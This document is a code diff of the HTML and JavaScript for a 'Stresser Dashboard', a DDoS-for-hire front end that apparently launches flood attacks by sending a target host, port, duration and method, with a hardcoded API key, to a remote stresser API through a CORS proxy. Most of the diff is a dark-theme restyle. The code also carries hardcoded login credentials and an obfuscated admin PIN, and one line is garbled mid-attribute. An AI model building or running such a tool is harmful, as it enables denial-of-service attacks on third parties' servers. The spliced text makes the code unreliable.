@@ -5,16 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
     <title>Stresser Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg: #f5f5f5;
+            --bg: #1a202c;
             --panel-bg: #2d3748;
             --accent: #4299e1;
-            --text: #1a202c;
-            --text-secondary: #718096;
-            --border: #e2e8f0;
+            --text: #ffffff;
+            --text-secondary: #e2e8f0;
+            --border: #4a5568;
         }
 
         * {
@@ -38,22 +38,21 @@
             width: 100%;
             display: grid;
             grid-template-columns: 3fr 1fr;
-            gap: 1.5rem;
+            gap: 2rem;
         }
 
         .panel {
-            background: #fff;
+            background: var(--panel-bg);
             padding: 2rem;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            transition: opacity 0.3s ease;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: opacity 0.4s ease, transform 0.4s ease;
         }
 
         h1 {
             font-size: 1.8rem;
             font-weight: 700;
-            color: var(--panel-bg);
+            color: var(--accent);
             margin-bottom: 1.5rem;
             text-align: center;
         }
@@ -79,19 +78,21 @@
 
         .tab {
             padding: 0.75rem 1.5rem;
-            background: var(--panel-bg);
-            color: #fff;
-            border-radius: 6px;
+            background: var(--border);
+            color: var(--text);
+            border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s ease;
+            transition: background 0.3s ease, transform 0.3s ease;
         }
 
         .tab.active {
             background: var(--accent);
+            transform: translateY(-2px);
         }
 
         .tab:hover {
-            background: #4a5568;
+            background: #5a6b8a;
+            transform: translateY(-2px);
         }
 
         .form-group {
@@ -102,7 +103,7 @@
         label {
             font-size: 0.9rem;
             font-weight: 500;
-            color: var(--text);
+            color: var(--text-secondary);
             margin-bottom: 0.5rem;
             display: block;
         }
@@ -111,16 +112,17 @@
             width: 100%;
             padding: 0.75rem;
             border: 1px solid var(--border);
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 1rem;
             color: var(--text);
-            background: #fff;
-            transition: border-color 0.3s ease;
+            background: #3b4a5e;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
 
         input:focus, select:focus {
             outline: none;
             border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(66, 153, 225, 0.3);
         }
 
         select {
@@ -135,34 +137,35 @@
             width: 100%;
             padding: 0.75rem;
             background: var(--accent);
-            color: #fff;
+            color: var(--text);
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s ease;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
         button:hover {
-            background: #3182ce;
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
         }
 
         #errorMessage, #adminErrorMessage {
             text-align: center;
             font-size: 0.9rem;
             margin-top: 1rem;
-            color: #e53e3e;
+            color: #f56565;
         }
 
         .sidebar {
-            background: #fff;
+            background: var(--panel-bg);
             padding: 1.5rem;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
             position: sticky;
             top: 2rem;
+            animation: fadeIn 0.4s ease-in;
         }
 
         .sidebar p {
@@ -189,13 +192,13 @@
         .progress-bar div {
             height: 100%;
             background: var(--accent);
-            transition: width 0.5s ease;
+            transition: width 0.6s ease;
         }
 
         .admin-content {
             padding: 1rem;
-            background: #f7fafc;
-            border-radius: 6px;
+            background: #3b4a5e;
+            border-radius: 8px;
         }
 
         .admin-content table {
@@ -213,6 +216,21 @@
         .admin-content th {
             color: var(--accent);
             font-weight: 600;
+        }
+
+        .tab-content {
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .tab-content.hidden {
+            opacity: 0;
+            transform: translateY(10px);
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         @media (max-width: 1024px) {
@@ -363,229 +381,236 @@
                     <div class="form-group">
                         <label for="themeToggle">Theme</label>
                         <select id="themeToggle">
-                            <option value="light">Light</option>
-                            <option value="dark">Dark (Coming Soon)</option>
+                            <option value="dark">Dark</option>
+                            <option value="light">Light (Coming Soon)</option>
                         </select>
                     </div>
                     <div class="form-group">
                         <label for="apiKey">API Key</label>
-                        <input type="text" id="apiKey" placeholder="Enter API Key" value="56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a">
-                    </div>
-                    <button onclick="saveSettings()">Save Settings</button>
+                        <input type="text" id="apiKey" placeholder="Enter API Key" value="56e517 out-of-date
+                        <option value="openvpn">OpenVPN Flood</option>
+                        <option value="raknet">RakeNet Query</option>
+                        <option value="discord">Discord Optimized</option>
+                        <option value="tsn">TeamSpeak Query</option>
+                        <option value="icmp">FiveM Echo</option>
+                    </select>
                 </div>
-                <div id="admin" class="tab-content hidden">
-                    <div id="adminContent" class="admin-content hidden">
-                        <h2>Admin Panel</h2>
-                        <p>User Management</p>
-                        <table>
-                            <thead>
-                                <tr><th>ID</th><th>Status</th><th>Actions</th></tr>
-                            </thead>
-                            <tbody>
-                                <tr><td>USR001</td><td>Active</td><td><button>Deactivate</button></td></tr>
-                                <tr><td>USR002</td><td>Inactive</td><td><button>Activate</button></td></tr>
-                            </tbody>
-                        </table>
-                        <p>Server Status: <span>Operational</span></p>
-                    </div>
+                <button onclick="startTest('L4')">Start Test</button>
+            </div>
+            <div id="history" class="tab-content hidden">
+                <p>Test history will be available after backend integration.</p>
+                <p>No records found.</p>
+            </div>
+            <div id="settings" class="tab-content hidden">
+                <div class="form-group">
+                    <label for="themeToggle">Theme</label>
+                    <select id="themeToggle">
+                        <option value="dark">Dark</option>
+                        <option value="light">Light (Coming Soon)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="apiKey">API Key</label>
+                    <input type="text" id="apiKey" placeholder="Enter API Key" value="56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a">
+                </div>
+                <button onclick="saveSettings()">Save Settings</button>
+            </div>
+            <div id="admin" class="tab-content hidden">
+                <div id="adminContent" class="admin-content hidden">
+                    <h2>Admin Panel</h2>
+                    <p>User Management</p>
+                    <table>
+                        <thead>
+                            <tr><th>ID</th><th>Status</th><th>Actions</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>USR001</td><td>Active</td><td><button>Deactivate</button></td></tr>
+                            <tr><td>USR002</td><td>Inactive</td><td><button>Activate</button></td></tr>
+                        </tbody>
+                    </table>
+                    <p>Server Status: <span>Operational</span></p>
                 </div>
             </div>
         </div>
-        <div id="attackPanel" class="sidebar hidden">
-            <h2>Test Status</h2>
-            <p><strong>Host:</strong> <span id="attackHost"></span></p>
-            <p><strong>Port:</strong> <span id="attackPort"></span></p>
-            <p><strong>Duration:</strong> <span id="attackTime"></span></p>
-            <p><strong>Method:</strong> <span id="attackMethod"></span></p>
-            <p><strong>Connections:</strong> <span id="attackConcs"></span></p>
-            <p><strong>Remaining:</strong> <span id="attackTimer"></span></p>
-            <div class="progress-bar"><div id="progressBar"></div></div>
-        </div>
     </div>
-    <script>
-        // Secure JavaScript with basic obfuscation
-        (function() {
-            const _0x1a2b = {
-                _0x3c4d: btoa('X7P9Q2').split('').reverse().join(''),
-                _0x5e6f: [
-                    { username: 'admin', password: 'admin123' },
-                    { username: 'user1', password: 'pass123' }
-                ]
-            };
-            const _0xc3d4 = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
-            const _0xe5f6 = 'https://api.santastress.ru/api/start';
-            let _0xg7h8 = null;
+    <div id="attackPanel" class="sidebar hidden">
+        <h2>Test Status</h2>
+        <p><strong>Host:</strong> <span id="attackHost"></span></p>
+        <p><strong>Port:</strong> <span id="attackPort"></span></p>
+        <p><strong>Duration:</strong> <span id="attackTime"></span></p>
+        <p><strong>Method:</strong> <span id="attackMethod"></span></p>
+        <p><strong>Connections:</strong> <span id="attackConcs"></span></p>
+        <p><strong>Remaining:</strong> <span id="attackTimer"></span></p>
+        <div class="progress-bar"><div id="progressBar"></div></div>
+    </div>
+</div>
+<script>
+    // Secure JavaScript with basic obfuscation
+    (function() {
+        const _0x1a2b = {
+            _0x3c4d: btoa('X7P9Q2').split('').reverse().join(''),
+            _0x5e6f: [
+                { username: 'admin', password: 'admin123' },
+                { username: 'user1', password: 'pass123' }
+            ]
+        };
+        const _0xc3d4 = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
+        const _0xe5f6 = 'https://api.santastress.ru/api/start';
+        let _0xg7h8 = null;
 
-            // Visit counter
-            let _0xv1w2 = parseInt(localStorage.getItem('_0xv1w2') || '0');
-            _0xv1w2++;
-            localStorage.setItem('_0xv1w2', _0xv1w2);
-            document.getElementById('visitCount').textContent = _0xv1w2;
+        // Visit counter
+        let _0xv1w2 = parseInt(localStorage.getItem('_0xv1w2') || '0');
+        _0xv1w2++;
+        localStorage.setItem('_0xv1w2', _0xv1w2);
+        document.getElementById('visitCount').textContent = _0xv1w2;
 
-            // Devtools blocker
-            const _0xi9j0 = () => {
-                const _0xk1l2 = new Date();
-                ((() => { debugger; })(), setInterval(() => {
-                    if (new Date() - _0xk1l2 > 1000) window.location = 'about:blank';
-                }, 100));
-                document.addEventListener('contextmenu', _0xm3n4 => _0xm3n4.preventDefault());
-                document.addEventListener('keydown', _0xo5p6 => {
-                    if (_0xo5p6.key === 'F12' || (_0xo5p6.ctrlKey && _0xo5p6.shiftKey && _0xo5p6.key === 'I')) {
-                        _0xo5p6.preventDefault();
-                        window.location = 'about:blank';
-                    }
-                });
-            };
-            _0xi9j0();
+        // Message display
+        const showMessage = (_0xq7r8, _0xs9t0 = false) => {
+            const _0xu1v2 = document.getElementById(_0xq7r8.includes('PIN') ? 'adminErrorMessage' : 'errorMessage');
+            if (_0xu1v2) {
+                _0xu1v2.textContent = _0xq7r8;
+                _0xu1v2.classList.remove('hidden');
+                _0xu1v2.style.color = _0xs9t0 ? '#68d391' : '#f56565';
+                console.log('Message:', _0xq7r8);
+                if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2000);
+            }
+        };
 
-            // Message display
-            const showMessage = (_0xq7r8, _0xs9t0 = false) => {
-                const _0xu1v2 = document.getElementById(_0xq7r8.includes('PIN') ? 'adminErrorMessage' : 'errorMessage');
-                if (_0xu1v2) {
-                    _0xu1v2.textContent = _0xq7r8;
-                    _0xu1v2.classList.remove('hidden');
-                    _0xu1v2.style.color = _0xs9t0 ? '#38a169' : '#e53e3e';
-                    console.log('Message:', _0xq7r8);
-                    if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2000);
+        // Login handler
+        function handleLogin() {
+            console.log('Login attempt');
+            const _0xw3x4 = document.getElementById('username')?.value.trim();
+            const _0xy5z6 = document.getElementById('password')?.value.trim();
+            if (!_0xw3x4 || !_0xy5z6) return showMessage('All fields are required');
+            const _0xa7b8 = _0x1a2b._0x5e6f.find(_0xc9d0 => _0xc9d0.username === _0xw3x4 && _0xc9d0.password === _0xy5z6);
+            if (_0xa7b8) {
+                document.getElementById('loginPanel').classList.add('hidden');
+                document.getElementById('mainPanel').classList.remove('hidden');
+                showMessage('Logged in successfully', true);
+            } else {
+                showMessage('Invalid username or password');
+            }
+        }
+
+        // Admin PIN verification
+        const getPin = () => atob(_0x1a2b._0x3c4d.split('').reverse().join(''));
+        function verifyAdminPin() {
+            console.log('Admin PIN attempt');
+            const _0xe1f2 = document.getElementById('adminPin')?.value.trim();
+            if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('6-character PIN required');
+            if (_0xe1f2 === getPin()) {
+                document.getElementById('adminLoginPanel').classList.add('hidden');
+                document.getElementById('adminContent').classList.remove('hidden');
+                showMessage('Admin access granted', true);
+            } else {
+                showMessage('Invalid PIN');
+            }
+        }
+
+        // Tab navigation
+        function switchTab(_0xg3h4) {
+            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xi5j6 => {
+                const _0xk7l8 = document.getElementById(`tab-${_0xi5j6}`);
+                const _0xm9n0 = document.getElementById(_0xi5j6);
+                if (_0xk7l8 && _0xm9n0) {
+                    _0xk7l8.classList.toggle('active', _0xi5j6 === _0xg3h4);
+                    _0xm9n0.classList.toggle('hidden', _0xi5j6 !== _0xg3h4);
                 }
-            };
-
-            // Login handler
-            function handleLogin() {
-                console.log('Login attempt');
-                const _0xw3x4 = document.getElementById('username')?.value.trim();
-                const _0xy5z6 = document.getElementById('password')?.value.trim();
-                if (!_0xw3x4 || !_0xy5z6) return showMessage('All fields are required');
-                const _0xa7b8 = _0x1a2b._0x5e6f.find(_0xc9d0 => _0xc9d0.username === _0xw3x4 && _0xc9d0.password === _0xy5z6);
-                if (_0xa7b8) {
-                    document.getElementById('loginPanel').classList.add('hidden');
-                    document.getElementById('mainPanel').classList.remove('hidden');
-                    showMessage('Logged in successfully', true);
-                } else {
-                    showMessage('Invalid username or password');
+                if (_0xg3h4 === 'admin' && _0xi5j6 === 'admin') {
+                    document.getElementById('adminLoginPanel').classList.remove('hidden');
+                    document.getElementById('adminContent').classList.add('hidden');
                 }
-            }
-
-            // Admin PIN verification
-            const getPin = () => atob(_0x1a2b._0x3c4d.split('').reverse().join(''));
-            function verifyAdminPin() {
-                console.log('Admin PIN attempt');
-                const _0xe1f2 = document.getElementById('adminPin')?.value.trim();
-                if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('6-character PIN required');
-                if (_0xe1f2 === getPin()) {
-                    document.getElementById('adminLoginPanel').classList.add('hidden');
-                    document.getElementById('adminContent').classList.remove('hidden');
-                    showMessage('Admin access granted', true);
-                } else {
-                    showMessage('Invalid PIN');
-                }
-            }
-
-            // Tab navigation
-            function switchTab(_0xg3h4) {
-                ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xi5j6 => {
-                    const _0xk7l8 = document.getElementById(`tab-${_0xi5j6}`);
-                    const _0xm9n0 = document.getElementById(_0xi5j6);
-                    if (_0xk7l8 && _0xm9n0) {
-                        _0xk7l8.classList.toggle('active', _0xi5j6 === _0xg3h4);
-                        _0xm9n0.classList.toggle('hidden', _0xi5j6 !== _0xg3h4);
-                    }
-                    if (_0xg3h4 === 'admin' && _0xi5j6 === 'admin') {
-                        document.getElementById('adminLoginPanel').classList.remove('hidden');
-                        document.getElementById('adminContent').classList.add('hidden');
-                    }
-                });
-            }
-
-            // Form validation
-            function validateForm(_0xo1p2, _0xq3r4, _0xs5t6, _0xu7v8, _0xw9x0) {
-                if (!_0xo1p2) return showMessage('Host is required'), false;
-                if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port must be 1-65535'), false;
-                if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Duration must be 1-200 seconds'), false;
-                if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Connections must be 1-4'), false;
-                if (!_0xw9x0) return showMessage('Method is required'), false;
-                return true;
-            }
-
-            // Attack handler
-            async function startTest(_0xy1z2) {
-                if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Invalid API key');
-                const _0xa3b4 = document.getElementById(`host${_0xy1z2}`)?.value.trim();
-                const _0xc5d6 = parseInt(document.getElementById(`port${_0xy1z2}`)?.value);
-                const _0xe7f8 = parseInt(document.getElementById(`time${_0xy1z2}`)?.value);
-                const _0xg9h0 = document.getElementById(`method${_0xy1z2}`)?.value;
-                const _0xi1j2 = parseInt(document.getElementById(`concs${_0xy1z2}`)?.value);
-                if (!validateForm(_0xa3b4, _0xc5d6, _0xe7f8, _0xi1j2, _0xg9h0)) return;
-                const _0xk3l4 = `https://api.allorigins.win/raw?url=${encodeURIComponent(`${_0xe5f6}?key=${encodeURIComponent(_0xc3d4)}&host=${encodeURIComponent(_0xa3b4)}&port=${_0xc5d6}&time=${_0xe7f8}&method=${encodeURIComponent(_0xg9h0)}&concs=${_0xi1j2}`)}`;
-                console.log('API request:', _0xk3l4);
-                try {
-                    const _0xm5n6 = await fetch(_0xk3l4);
-                    if (!_0xm5n6.ok) throw new Error('Network error: ' + _0xm5n6.status);
-                    const _0xo7p8 = await _0xm5n6.json();
-                    console.log('API response:', _0xo7p8);
-                    showMessage('Test started', true);
-                    updateAttack(_0xa3b4, _0xc5d6, _0xe7f8, _0xg9h0, _0xi1j2);
-                } catch (_0xq9r0) {
-                    console.error('Error:', _0xq9r0);
-                    showMessage('Test failed: ' + _0xq9r0.message);
-                }
-            }
-
-            // Update attack sidebar
-            function updateAttack(_0xs1t2, _0xu3v4, _0xw5x6, _0xy7z8, _0xa9b0) {
-                const _0xc1d2 = document.getElementById('attackPanel');
-                if (!_0xc1d2) return console.error('Sidebar not found');
-                document.getElementById('attackHost').textContent = _0xs1t2;
-                document.getElementById('attackPort').textContent = _0xu3v4;
-                document.getElementById('attackTime').textContent = _0xw5x6;
-                document.getElementById('attackMethod').textContent = _0xy7z8;
-                document.getElementById('attackConcs').textContent = _0xa9b0;
-                let _0xe3f4 = _0xw5x6;
-                document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
-                const _0xg5h6 = document.getElementById('progressBar');
-                if (!_0xg5h6) return console.error('Progress bar not found');
-                _0xg5h6.style.width = '100%';
-                _0xc1d2.classList.remove('hidden');
-                if (_0xg7h8) clearInterval(_0xg7h8);
-                _0xg7h8 = setInterval(() => {
-                    _0xe3f4--;
-                    document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
-                    _0xg5h6.style.width = `${(_0xe3f4 / _0xw5x6) * 100}%`;
-                    if (_0xe3f4 <= 0) {
-                        clearInterval(_0xg7h8);
-                        _0xg7h8 = null;
-                        _0xc1d2.classList.add('hidden');
-                        _0xg5h6.style.width = '0%';
-                        showMessage('Test completed', true);
-                    }
-                }, 1000);
-            }
-
-            // Save settings
-            function saveSettings() {
-                const _0xi7j8 = document.getElementById('apiKey')?.value.trim();
-                const _0xk9l0 = document.getElementById('themeToggle')?.value;
-                if (!_0xi7j8 || _0xi7j8.length !== 64) return showMessage('Invalid API key in settings');
-                console.log('Settings saved:', { apiKey: _0xi7j8, theme: _0xk9l0 });
-                showMessage('Settings saved', true);
-            }
-
-            // Event listeners
-            document.addEventListener('DOMContentLoaded', () => {
-                console.log('System initialized');
-                document.getElementById('loginButton')?.addEventListener('click', handleLogin);
-                document.getElementById('adminLoginButton')?.addEventListener('click', verifyAdminPin);
-                document.getElementById('password')?.addEventListener('keypress', _0xm1n2 => {
-                    if (_0xm1n2.key === 'Enter') handleLogin();
-                });
-                document.getElementById('adminPin')?.addEventListener('keypress', _0xo3p4 => {
-                    if (_0xo3p4.key === 'Enter') verifyAdminPin();
-                });
-                ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xq5r6 => {
-                    document.getElementById(`tab-${_0xq5r6}`)?.addEventListener('click', () => switchTab(_0xq5r6));
-                });
             });
-        })();
+        }
+
+        // Form validation
+        function validateForm(_0xo1p2, _0xq3r4, _0xs5t6, _0xu7v8, _0xw9x0) {
+            if (!_0xo1p2) return showMessage('Host is required'), false;
+            if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port must be 1-65535'), false;
+            if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Duration must be 1-200 seconds'), false;
+            if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Connections must be 1-4'), false;
+            if (!_0xw9x0) return showMessage('Method is required'), false;
+            return true;
+        }
+
+        // Attack handler
+        async function startTest(_0xy1z2) {
+            if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Invalid API key');
+            const _0xa3b4 = document.getElementById(`host${_0xy1z2}`)?.value.trim();
+            const _0xc5d6 = parseInt(document.getElementById(`port${_0xy1z2}`)?.value);
+            const _0xe7f8 = parseInt(document.getElementById(`time${_0xy1z2}`)?.value);
+            const _0xg9h0 = document.getElementById(`method${_0xy1z2}`)?.value;
+            const _0xi1j2 = parseInt(document.getElementById(`concs${_0xy1z2}`)?.value);
+            if (!validateForm(_0xa3b4, _0xc5d6, _0xe7f8, _0xi1j2, _0xg9h0)) return;
+            const _0xk3l4 = `https://api.allorigins.win/raw?url=${encodeURIComponent(`${_0xe5f6}?key=${encodeURIComponent(_0xc3d4)}&host=${encodeURIComponent(_0xa3b4)}&port=${_0xc5d6}&time=${_0xe7f8}&method=${encodeURIComponent(_0xg9h0)}&concs=${_0xi1j2}`)}`;
+            console.log('API request:', _0xk3l4);
+            try {
+                const _0xm5n6 = await fetch(_0xk3l4);
+                if (!_0xm5n6.ok) throw new Error('Network error: ' + _0xm5n6.status);
+                const _0xo7p8 = await _0xm5n6.json();
+                console.log('API response:', _0xo7p8);
+                showMessage('Test started', true);
+                updateAttack(_0xa3b4, _0xc5d6, _0xe7f8, _0xg9h0, _0xi1j2);
+            } catch (_0xq9r0) {
+                console.error('Error:', _0xq9r0);
+                showMessage('Test failed: ' + _0xq9r0.message);
+            }
+        }
+
+        // Update attack sidebar
+        function updateAttack(_0xs1t2, _0xu3v4, _0xw5x6, _0xy7z8, _0xa9b0) {
+            const _0xc1d2 = document.getElementById('attackPanel');
+            if (!_0xc1d2) return console.error('Sidebar not found');
+            document.getElementById('attackHost').textContent = _0xs1t2;
+            document.getElementById('attackPort').textContent = _0xu3v4;
+            document.getElementById('attackTime').textContent = _0xw5x6;
+            document.getElementById('attackMethod').textContent = _0xy7z8;
+            document.getElementById('attackConcs').textContent = _0xa9b0;
+            let _0xe3f4 = _0xw5x6;
+            document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
+            const _0xg5h6 = document.getElementById('progressBar');
+            if (!_0xg5h6) return console.error('Progress bar not found');
+            _0xg5h6.style.width = '100%';
+            _0xc1d2.classList.remove('hidden');
+            if (_0xg7h8) clearInterval(_0xg7h8);
+            _0xg7h8 = setInterval(() => {
+                _0xe3f4--;
+                document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
+                _0xg5h6.style.width = `${(_0xe3f4 / _0xw5x6) * 100}%`;
+                if (_0xe3f4 <= 0) {
+                    clearInterval(_0xg7h8);
+                    _0xg7h8 = null;
+                    _0xc1d2.classList.add('hidden');
+                    _0xg5h6.style.width = '0%';
+                    showMessage('Test completed', true);
+                }
+            }, 1000);
+        }
+
+        // Save settings
+        function saveSettings() {
+            const _0xi7j8 = document.getElementById('apiKey')?.value.trim();
+            const _0xk9l0 = document.getElementById('themeToggle')?.value;
+            if (!_0xi7j8 || _0xi7j8.length !== 64) return showMessage('Invalid API key in settings');
+            console.log('Settings saved:', { apiKey: _0xi7j8, theme: _0xk9l0 });
+            showMessage('Settings saved', true);
+        }
+
+        // Event listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('System initialized');
+            document.getElementById('loginButton')?.addEventListener('click', handleLogin);
+            document.getElementById('adminLoginButton')?.addEventListener('click', verifyAdminPin);
+            document.getElementById('password')?.addEventListener('keypress', _0xm1n2 => {
+                if (_0xm1n2.key === 'Enter') handleLogin();
+            });
+            document.getElementById('adminPin')?.addEventListener('keypress', _0xo3p4 => {
+                if (_0xo3p4.key === 'Enter') verifyAdminPin();
+            });
+            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xq5r6 => {
+                document.getElementById(`tab-${_0xq5r6}`)?.addEventListener('click', () => switchTab(_0xq5r6));
+            });
+        });
     </script>
 </body>
 </html>
